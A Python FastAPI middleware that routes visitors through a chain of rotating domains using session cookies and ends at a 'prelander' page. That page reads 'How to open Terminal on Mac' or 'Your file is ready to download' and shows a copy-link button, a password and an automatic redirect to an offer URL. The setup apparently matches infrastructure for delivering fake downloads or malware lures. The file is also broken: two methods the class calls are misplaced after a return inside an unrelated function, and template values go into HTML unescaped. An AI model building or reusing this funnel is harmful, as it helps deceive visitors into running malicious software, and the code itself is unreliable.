from fastapi import Request, Response
from fastapi.responses import RedirectResponse, HTMLResponse
from starlette.middleware.base import BaseHTTPMiddleware
from urllib.parse import urlparse
import secrets
import random
from datetime import datetime, timedelta
from typing import Optional
import logging

from app.models.redirect_chain import (
    LEGACY_INTER_DOMAIN_KEY,
    LEGACY_PRELANDER_POOL_KEY,
    chain_inter_domain,
    chain_prelander_pool,
)

# Make imports more defensive for startup
try:
    from app.database import get_database
    from app.cache.redis_client import get_redis
except ImportError as e:
    logging.warning(f"Import error in redirect chain middleware: {e}")
    # Create dummy functions to prevent startup errors
    def get_database():
        return None
    def get_redis():
        return None


class RedirectChainMiddleware(BaseHTTPMiddleware):
    """
    3-tier redirect chain middleware that handles:
    1. Anchor Domain → generates session cookie
    2. Intermediate Domain → validates session cookie  
    3. Pre-lander Domain → final destination (rotated from pool)
    
    This middleware intercepts requests to configured redirect chain domains
    and handles the session validation and routing logic.

    DISABLED: the Redirection Chain system is intentionally NOT connected to
    the redirection-domain flow right now (admin request — the classic
    redirection-domain flow is the only driver). Every request passes
    straight through. Re-enable the dispatch body below when chains are
    re-wired properly; every chain domain must then be normalized through
    domain_to_url() before being used to build a redirect URL.
    """
    
    async def dispatch(self, request: Request, call_next):
        # Chains disconnected from the redirection-domain flow — pass through.
        return await call_next(request)

    async def _dispatch_chains(self, request: Request, call_next):
        """The chain-aware dispatch (dormant — not wired to the app)."""
        try:
            # API and infrastructure paths must always reach their handlers:
            # the /d/[slug] Next.js page drives the browser hops via the
            # prelander API (/domain-type, /resolve), which returns JSON the
            # page reads. Intercepting those would 302 a fetch() across
            # domains and break the JSON contract — the chain progression for
            # browsers is handled by the API + page navigation.
            path = request.url.path
            if (
                path.startswith("/api/")
                or path.startswith("/docs")
                or path in ("/click", "/ad.js", "/health", "/redoc", "/openapi.json")
            ):
                return await call_next(request)

            # Strip any port the proxy left on the Host header — chain domains
            # are stored as bare hostnames.
            host = request.headers.get("host", "").lower().split(":")[0]
            
            # Check if this is a redirect chain domain
            db = get_database()
            redis = get_redis()
            
            # Skip if database/redis not available (startup phase)
            if db is None or redis is None:
                return await call_next(request)
            
            # Look up if this domain is part of any redirect chain
            chain = await self._get_chain_for_domain(db, host)
            if not chain:
                # Not a redirect chain domain, continue normally
                return await call_next(request)
            
            # Determine the position of this domain in the chain
            chain_position = self._get_domain_position_in_chain(chain, host)
            
            # Handle the redirect chain flow based on position
            if chain_position == "anchor":
                return await self._handle_anchor_step(request, chain, db, redis)
            elif chain_position == "inter":
                return await self._handle_intermediate_step(request, chain, db, redis)
            elif chain_position == "prelander":
                return await self._handle_prelander_step(request, chain, db, redis)
            elif chain_position.startswith("extra_"):
                # Handle extra hop domains (C, D, E, etc.)
                hop_index = int(chain_position.split("_")[1])
                return await self._handle_extra_hop(request, chain, db, redis, hop_index)
            else:
                # Unknown domain in chain, continue normally
                return await call_next(request)
        except Exception as e:
            # Log error but don't break the request
            logging.error(f"RedirectChainMiddleware error: {e}")
            return await call_next(request)
    
    async def _get_chain_for_domain(self, db, domain: str):
        """Find redirect chain that includes this domain."""
        # Matches both the canonical keys and the pre-migration ones, so chains
        # written before migration 005 still resolve.
        return await db.redirect_chains.find_one({
            "$or": [
                {"anchor_domain": domain},
                {"inter_domain": domain},
                {LEGACY_INTER_DOMAIN_KEY: domain},
                {"prelander_pool": domain},
                {LEGACY_PRELANDER_POOL_KEY: domain},
                {"extra_domains": domain},  # Support configurable chain length
            ],
            "status": "active"
        })
    
    def _get_domain_position_in_chain(self, chain: dict, domain: str) -> str:
        """
        Determine the position of a domain in the chain.
        Returns: 'anchor', 'inter', 'extra_N' (where N is the index), or 'prelander'
        """
        if domain == chain["anchor_domain"]:
            return "anchor"
        elif domain == chain_inter_domain(chain):
            return "inter"
        
        # Check extra domains
        extra_domains = chain.get("extra_domains", [])
        if domain in extra_domains:
            return f"extra_{extra_domains.index(domain)}"
        
        # Check prelander pool
        if domain in chain_prelander_pool(chain):
            return "prelander"
        
        return "unknown"
    
    def _get_next_hop_in_chain(self, chain: dict, current_position: str) -> Optional[str]:
        """
        Get the next domain in the chain based on current position.
        Chain flow: Anchor → Inter → Extra[0] → Extra[1] → ... → Extra[N] → Prelander
        """
        extra_domains = chain.get("extra_domains", [])
        
        if current_position == "anchor":
            return chain_inter_domain(chain)
        elif current_position == "inter":
            # If there are extra hops, go to the first one, otherwise go to prelander
            if extra_domains:
                return extra_domains[0]
            else:
                # Return prelander from pool (will be selected with weights)
                return "PRELANDER_POOL"
        elif current_position.startswith("extra_"):
            hop_index = int(current_position.split("_")[1])
            # If there's a next extra hop, return it
            if hop_index + 1 < len(extra_domains):
                return extra_domains[hop_index + 1]
            else:
                # Last extra hop, go to prelander
                return "PRELANDER_POOL"
        
        return None
    
    async def _handle_anchor_step(self, request: Request, chain: dict, db, redis):
        """
        Anchor domain: Generate session cookie and redirect to the Inter domain.
        """
        from app.services.domain_service import select_active_prelander

        chain_id = str(chain["_id"])
        visitor_ip = self._get_client_ip(request)
        user_agent = request.headers.get("user-agent", "")
        
        # Generate session token
        session_token = secrets.token_urlsafe(32)

        # Prelander selection: only ACTIVE pool domains participate, chosen by
        # weight. Inactive prelanders get no traffic (redistribution rule);
        # if none are active the session falls back to the first configured
        # host so the chain never invents a replacement domain.
        pool = chain_prelander_pool(chain)
        selected_prelander = await select_active_prelander(db, pool)
        if not selected_prelander:
            if not pool:
                import logging as _logging
                _logging.error(
                    "Redirect chain %s has an empty prelander pool", chain_id
                )
                return await self._block_request(request, chain, db, "no_active_prelander")
            selected_prelander = pool[0]

        # Store session in Redis with cookie lifetime
        session_data = {
            "chain_id": chain_id,
            "visitor_ip": visitor_ip,
            "user_agent": user_agent,
            "anchor_timestamp": datetime.utcnow().isoformat(),
            "selected_prelander": selected_prelander,
            "is_valid": True,
        }
        
        # Set session in Redis with cookie lifetime
        await redis.setex(
            f"redirect_chain_session:{session_token}",
            chain["cookie_lifetime"] * 60,  # Convert minutes to seconds
            str(session_data)
        )
        
        # Update chain stats
        await db.redirect_chains.update_one(
            {"_id": chain["_id"]},
            {"$inc": {"total_sessions": 1}}
        )
        
        # Create session record in database
        session_record = {
            "chain_id": chain_id,
            "session_token": session_token,
            "visitor_ip": visitor_ip,
            "user_agent": user_agent,
            "anchor_timestamp": datetime.utcnow(),
            "selected_prelander": session_data["selected_prelander"],
            "is_valid": True,
            "created_at": datetime.utcnow(),
            "expires_at": datetime.utcnow() + timedelta(minutes=chain["cookie_lifetime"])
        }
        await db.redirect_chain_sessions.insert_one(session_record)
        
        # Redirect to the Inter domain with session cookie
        intermediate_url = f"https://{chain_inter_domain(chain)}{request.url.path}"
        if request.url.query:
            intermediate_url += f"?{request.url.query}"
        
        response = RedirectResponse(url=intermediate_url, status_code=302)
        response.set_cookie(
            key=f"rcs_{chain_id}",
            value=session_token,
            max_age=chain["cookie_lifetime"] * 60,
            secure=True,
            httponly=True,
            samesite="strict"
        )
        
        return response
    
    async def _handle_intermediate_step(self, request: Request, chain: dict, db, redis):
        """
        Intermediate domain: Validate session cookie and redirect to next hop.
        Next hop could be an extra domain or prelander pool.

        Validation failure is counted but does NOT strand the visitor: cookies
        set on the Anchor are SameSite=strict and are frequently not attached
        on the first cross-domain hop (or stripped by browser settings), so a
        missing/invalid session falls back to progressing the hop — the chain
        stats record the anomaly while the visitor always leaves with a URL.
        """
        if not chain.get("session_validation", True):
            # Session validation disabled, pass through
            return await self._redirect_to_next_hop(request, chain, db, "inter")
        
        chain_id = str(chain["_id"])
        cookie_name = f"rcs_{chain_id}"
        session_token = request.cookies.get(cookie_name)
        
        session_info = None
        validation_failure = None
        if not session_token:
            validation_failure = "missing_session_cookie"
        else:
            # Validate session in Redis
            session_key = f"redirect_chain_session:{session_token}"
            session_data = await redis.get(session_key)
            
            if not session_data:
                validation_failure = "session_expired"
            else:
                # Parse session data
                try:
                    import ast
                    session_info = ast.literal_eval(session_data.decode() if isinstance(session_data, bytes) else session_data)
                except:
                    validation_failure = "invalid_session_data"
                
                # Validate IP and User-Agent for basic fingerprinting
                if session_info is not None:
                    visitor_ip = self._get_client_ip(request)
                    user_agent = request.headers.get("user-agent", "")
                    
                    if (session_info.get("visitor_ip") != visitor_ip or 
                        session_info.get("user_agent") != user_agent):
                        validation_failure = "fingerprint_mismatch"
        
        if validation_failure:
            # Count the anomaly, then progress the visitor anyway — the chain
            # must never dead-end a real visitor on a cookie technicality.
            logging.warning(
                "[CHAIN] Inter hop validation failed (%s) on chain %s — progressing anyway",
                validation_failure, chain_id,
            )
            await db.redirect_chains.update_one(
                {"_id": chain["_id"]},
                {"$inc": {"blocked_sessions": 1}}
            )
            return await self._redirect_to_next_hop(request, chain, db, "inter")
        
        # Update session record (glossary field per migration 005 / model:
        # inter_timestamp, not the legacy intermediate_timestamp spelling)
        await db.redirect_chain_sessions.update_one(
            {"session_token": session_token},
            {"$set": {"inter_timestamp": datetime.utcnow()}}
        )
        
        # Redirect to next hop (extra domain or prelander)
        return await self._redirect_to_next_hop(request, chain, db, "inter", session_info, cookie_name, session_token)
    
    async def _handle_extra_hop(self, request: Request, chain: dict, db, redis, hop_index: int):
        """
        Handle extra hop domains (C, D, E, etc.) in configurable-length chains.
        Validates session and redirects to the next hop or prelander.

        Same visitor-never-stranded rule as the Inter hop: a validation failure
        is counted and the visitor progresses to the next hop.
        """
        if not chain.get("session_validation", True):
            # Session validation disabled, pass through
            return await self._redirect_to_next_hop(request, chain, db, f"extra_{hop_index}")
        
        chain_id = str(chain["_id"])
        cookie_name = f"rcs_{chain_id}"
        session_token = request.cookies.get(cookie_name)
        
        session_info = None
        validation_failure = None
        if not session_token:
            validation_failure = "missing_session_cookie"
        else:
            session_key = f"redirect_chain_session:{session_token}"
            session_data = await redis.get(session_key)
            
            if not session_data:
                validation_failure = "session_expired"
            else:
                try:
                    import ast
                    session_info = ast.literal_eval(session_data.decode() if isinstance(session_data, bytes) else session_data)
                except:
                    validation_failure = "invalid_session_data"
                
                if session_info is not None:
                    visitor_ip = self._get_client_ip(request)
                    user_agent = request.headers.get("user-agent", "")
                    if (session_info.get("visitor_ip") != visitor_ip or 
                        session_info.get("user_agent") != user_agent):
                        validation_failure = "fingerprint_mismatch"
        
        if validation_failure:
            logging.warning(
                "[CHAIN] Extra hop %s validation failed (%s) on chain %s — progressing anyway",
                hop_index, validation_failure, chain_id,
            )
            await db.redirect_chains.update_one(
                {"_id": chain["_id"]},
                {"$inc": {"blocked_sessions": 1}}
            )
            return await self._redirect_to_next_hop(request, chain, db, f"extra_{hop_index}")
        
        # Update session record with extra hop timestamp
        await db.redirect_chain_sessions.update_one(
            {"session_token": session_token},
            {"$set": {f"extra_hop_{hop_index}_timestamp": datetime.utcnow()}}
        )
        
        # Redirect to next hop
        return await self._redirect_to_next_hop(request, chain, db, f"extra_{hop_index}", session_info, cookie_name, session_token)
    
    async def _handle_prelander_step(self, request: Request, chain: dict, db, redis):
        """
        Pre-lander domain: Final validation and serve content or redirect.

        Same visitor-never-stranded rule: a validation failure is counted and
        the prelander content is still served.
        """
        if not chain.get("session_validation", True):
            # Session validation disabled, serve content normally
            return await self._serve_prelander_content(request, chain, db)
        
        chain_id = str(chain["_id"])
        cookie_name = f"rcs_{chain_id}"
        session_token = request.cookies.get(cookie_name)
        
        session_info = None
        validation_failure = None
        if not session_token:
            validation_failure = "missing_session_cookie"
        else:
            session_key = f"redirect_chain_session:{session_token}"
            session_data = await redis.get(session_key)
            
            if not session_data:
                validation_failure = "session_expired"
            else:
                try:
                    import ast
                    session_info = ast.literal_eval(session_data.decode() if isinstance(session_data, bytes) else session_data)
                except:
                    validation_failure = "invalid_session_data"
                
                if session_info is not None:
                    visitor_ip = self._get_client_ip(request)
                    user_agent = request.headers.get("user-agent", "")
                    if (session_info.get("visitor_ip") != visitor_ip or 
                        session_info.get("user_agent") != user_agent):
                        validation_failure = "fingerprint_mismatch"
        
        if validation_failure:
            # Count the anomaly, then serve the prelander anyway — the visitor
            # must never be stranded on a cookie technicality.
            logging.warning(
                "[CHAIN] Prelander validation failed (%s) on chain %s — serving anyway",
                validation_failure, chain_id,
            )
            await db.redirect_chains.update_one(
                {"_id": chain["_id"]},
                {"$inc": {"blocked_sessions": 1}}
            )
            return await self._serve_prelander_content(request, chain, db)
        
        # Update session as completed
        await db.redirect_chain_sessions.update_one(
            {"session_token": session_token},
            {"$set": {"prelander_timestamp": datetime.utcnow()}}
        )
        
        # Update valid sessions count
        await db.redirect_chains.update_one(
            {"_id": chain["_id"]},
            {"$inc": {"valid_sessions": 1}}
        )
        
        # Serve the pre-lander content or redirect to final destination
        return await self._serve_prelander_content(request, chain, db)
    
    async def _redirect_to_prelander(self, request: Request, chain: dict, db):
        """Redirect to a Prelander domain (when validation is disabled).

        Uses weighted selection among active pool domains — an inactive
        prelander must receive no traffic.
        """
        from app.services.domain_service import select_active_prelander

        prelander_domain = await select_active_prelander(
            db, chain_prelander_pool(chain)
        )
        if not prelander_domain:
            pool = chain_prelander_pool(chain)
            if not pool:
                return await self._block_request(request, chain, db, "no_active_prelander")
            prelander_domain = pool[0]
        prelander_url = f"https://{prelander_domain}{request.url.path}"
        if request.url.query:
            prelander_url += f"?{request.url.query}"
        
        return RedirectResponse(url=prelander_url, status_code=302)
    
    async def _redirect_to_next_hop(
        self, 
        request: Request, 
        chain: dict, 
        db, 
        current_position: str,
        session_info: Optional[dict] = None,
        cookie_name: Optional[str] = None,
        session_token: Optional[str] = None
    ):
        """
        Redirect to the next hop in the chain based on current position.
        Supports configurable chain length: Anchor → Inter → C → D → ... → Prelander
        """
        from app.services.domain_service import select_active_prelander
        
        next_hop = self._get_next_hop_in_chain(chain, current_position)
        
        if not next_hop:
            return await self._block_request(request, chain, db, "invalid_chain_configuration")
        
        # If next hop is prelander pool, select one
        if next_hop == "PRELANDER_POOL":
            if session_info and "selected_prelander" in session_info:
                # Use pre-selected prelander from session
                next_domain = session_info["selected_prelander"]
            else:
                # Select weighted prelander
                next_domain = await select_active_prelander(db, chain_prelander_pool(chain))
                if not next_domain:
                    pool = chain_prelander_pool(chain)
                    if not pool:
                        return await self._block_request(request, chain, db, "no_active_prelander")
                    next_domain = pool[0]
        else:
            next_domain = next_hop
        
        # Build next URL
        next_url = f"https://{next_domain}{request.url.path}"
        if request.url.query:
            next_url += f"?{request.url.query}"
        
        response = RedirectResponse(url=next_url, status_code=302)
        
        # Keep session cookie if we have one
        if cookie_name and session_token:
            response.set_cookie(
                key=cookie_name,
                value=session_token,
                max_age=chain["cookie_lifetime"] * 60,
                secure=True,
                httponly=True,
                samesite="strict"
            )
        
        return response
    
    async def _serve_prelander_content(self, request: Request, chain: dict, db):
        """
        Serve the prelander content when a Prelander-position domain's /d/{slug}
        request reaches FastAPI (this middleware intercepts it before the
        router).

        The real prelander page is the Next.js /d/[slug] app. Since this
        request already carries the slug on the FINAL prelander domain, the
        page fetches its data via /api/prelander/resolve — but the browser
        landed here with a full-page request, and redirecting it back to the
        same domain would loop. So serve the real thing directly: resolve the
        slug's offer/password/template server-side and render the prelander
        HTML exactly like the /p/render endpoint does.
        """
        from fastapi.responses import HTMLResponse
        from app.routers.prelander_router import (
            _decode_slug, _get_prelander_data, _request_is_authorized,
        )
        from app.services.prelander_service import generate_fallback_html
        import logging as _logging

        # /d/{slug} path — the slug is the last path segment
        path = request.url.path.rstrip("/")
        slug = path.rsplit("/", 1)[-1] if "/" in path else ""
        if not slug:
            return HTMLResponse(
                content=generate_fallback_html("Not Found"),
                status_code=404,
            )

        # SERVER-SIDE AUTHORIZATION GATE — DOMAIN != AUTHORIZATION. Before any
        # protected prelander HTML is resolved, the visitor must hold the
        # click-time authorization session (same gate as the /prelander/resolve
        # API). Direct visits get the STEP 6 configurable denied fallback.
        if not await _request_is_authorized(request, slug, db):
            from app.services.prelander_auth_service import build_denied_response
            return build_denied_response()

        decoded = _decode_slug(slug)
        if not decoded:
            return HTMLResponse(
                content=generate_fallback_html("Not Found"),
                status_code=404,
            )

        try:
            data = await _get_prelander_data(
                request, decoded["os"], db,
                offer_id=decoded.get("offer_id"),
                campaign_id=decoded.get("campaign_id"),
                country_code=decoded.get("country_code"),
            )
        except Exception as e:
            _logging.warning("[CHAIN] Prelander content resolution failed: %s", e)
            return HTMLResponse(
                content=generate_fallback_html("Template Error"),
                status_code=500,
            )

        # A server-rendered custom template is returned as rendered_html —
        # serve it as a complete document.
        if data.get("rendered_html"):
            return HTMLResponse(content=data["rendered_html"], status_code=200)

        # No active template → skip straight to the offer (same rule as the
        # Next.js page: never render an empty prelander).
        if data.get("skip_prelander") and data.get("offer_url"):
            return RedirectResponse(url=data["offer_url"], status_code=302)

        # Simple customisation fields → build the standard prelander document.
        html = _build_simple_prelander_html(data)
        return HTMLResponse(content=html, status_code=200)


def _build_simple_prelander_html(data: dict) -> str:
    """
    Build a standalone prelander document from the resolved template fields
    (title/subtitle/button/password), mirroring the Next.js /d page layouts.
    """
    tpl = data.get("template") or {}
    is_mac = (data.get("os") or "").lower() == "mac"
    title = tpl.get("title") or ("How to open Terminal on Mac" if is_mac else "Your file is ready to download")
    subtitle = tpl.get("subtitle") or "Your file is prepared. Copy the link to download."
    button = tpl.get("button_text") or "Copy"
    offer_url = data.get("offer_url") or ""
    password = data.get("password") if (tpl.get("show_password_field", True) and data.get("password")) else None

    password_html = (
        f'<div style="margin-top:16px;background:#fffbeb;border:1px solid #fcd34d;'
        f'border-radius:12px;padding:14px 16px;font-size:16px;font-family:monospace;'
        f'letter-spacing:2px;color:#92400e">{password}</div>'
        if password else ""
    )

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download Ready</title>
<style>
  body {{ margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center;
         background:#f0f2f5; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; padding:20px; }}
  .card {{ background:#fff; border-radius:16px; box-shadow:0 8px 30px rgba(0,0,0,.08); max-width:440px; width:100%;
           padding:36px 28px; text-align:center; }}
  h1 {{ font-size:20px; color:#111827; margin:14px 0 8px; }}
  p {{ font-size:14px; color:#6b7280; margin:0 0 22px; }}
  .link {{ display:flex; gap:8px; background:#f9fafb; border:1px solid #e5e7eb; border-radius:12px; padding:6px; }}
  .url {{ flex:1; padding:10px 12px; font-family:monospace; font-size:13px; color:#374151;
          overflow:hidden; text-overflow:ellipsis; white-space:nowrap; text-align:left; }}
  button {{ border:0; background:#111827; color:#fff; font-weight:600; font-size:13px;
            padding:10px 18px; border-radius:10px; cursor:pointer; }}
  button:hover {{ background:#1f2937; }}
</style>
</head>
<body>
  <div class="card">
    <h1>{title}</h1>
    <p>{subtitle}</p>
    <div class="link">
      <span class="url">{offer_url}</span>
      <button onclick="navigator.clipboard.writeText(document.querySelector('.url').textContent)">{button}</button>
    </div>
    {password_html}
  </div>
  <script>setTimeout(function() {{ window.location.replace({offer_url!r}); }}, 3000);</script>
</body>
</html>"""
    
    async def _block_request(self, request: Request, chain: dict, db, reason: str):
        """Block invalid requests and update stats."""
        # Update blocked sessions count
        await db.redirect_chains.update_one(
            {"_id": chain["_id"]},
            {"$inc": {"blocked_sessions": 1}}
        )
        
        # Return a generic error page or redirect
        error_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Access Error</title>
        </head>
        <body>
            <div style="text-align: center; padding: 50px; font-family: Arial;">
                <h1>Access Denied</h1>
                <p>Invalid session. Please start from the beginning.</p>
            </div>
        </body>
        </html>
        """
        
        return HTMLResponse(content=error_content, status_code=403)
    
    def _get_client_ip(self, request: Request) -> str:
        """Extract client IP with CloudFlare/proxy support."""
        cf_ip = request.headers.get("cf-connecting-ip")
        if cf_ip:
            return cf_ip
        
        xff = request.headers.get("x-forwarded-for")
        if xff:
            return xff.split(",")[0].strip()
        
        return request.client.host if request.client else "unknown"